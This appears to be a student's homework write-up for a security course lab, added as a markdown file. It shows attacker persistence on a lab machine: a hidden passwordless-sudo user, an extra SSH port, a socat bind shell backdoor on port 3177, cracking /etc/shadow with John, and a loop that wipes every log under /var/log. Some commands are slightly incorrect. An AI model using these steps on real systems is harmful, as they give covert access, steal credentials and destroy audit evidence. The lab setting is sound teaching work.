@@ -1,0 +1,68 @@
+## Submission for Unit 6 Advanced Bash Homework
+
+Create a secret user named `sysd`. Make sure this user doesn't have a home folder created.
+- `sudo useradd sysd`
+
+Give your secret user a password. 
+- `sudo passwd sysd secret`
+
+Give your secret user a system UID < 1000.
+- `usermod -u 300 sysd`
+
+Give your secret user the same GID
+- `groupmod -g 300 sysd` 
+
+Give your secret user full sudo access without the need for a password.
+- `visudo`
+
+Test that sudo access works without your password
+
+```bash
+sysd ALL=(ALL:ALL) NOPASSWD:ALL
+``` 
+
+## Allow ssh access over port 2222.
+
+```bash
+underneath where it says Port 22
+
+Port 2222
+``` 
+
+Note the IP address of this system:
+- `192.168.75.50`
+Exit the root accout.
+- `exit`
+SSH to the machine using your sysd account and port 2222
+- `sudo ssh sysd@192.168.75.50 -p 2222`
+Use sudo to switch to the root user
+- `sudo su`
+
+### Create a backdoor with socat
+- Install socat
+  - `sudo apt install socat -y`
+- Run Socat command in the background
+  - `socat TCP4-Listen:3177,fork EXEC:/bin/bash &`
+- Explain each part of the `socat` command:
+  - `socat calls for the socat program`
+  - `tcp4-listen:3177 listens for tcp connects on port 3177`
+  - `,fork allow multiple tcp connections at same time
+  - `exec:/bin/bash runs a bash shell over the connection
+  - `& runs this command in the background
+
+- Exit the SSH session
+  - `exit
+- Test socat connection from the Ubuntu machine:
+  - `exit`
+- Close the `socat` connection.
+  - `ctrl c`
+
+## Crack _all_ the passwords
+Ssh back to the system using your sysd account
+- `sudo ssh sysd@192.168.75.50 -p 2222`
+- Use John to crack the entire /etc/shadow file
+    - `john /etc/shadow`
+
+## Cover your tracks
+- Use socat and a for loop to clear all system logs.
+- `for i in $(ls /var/log); do echo '' > $i; done`
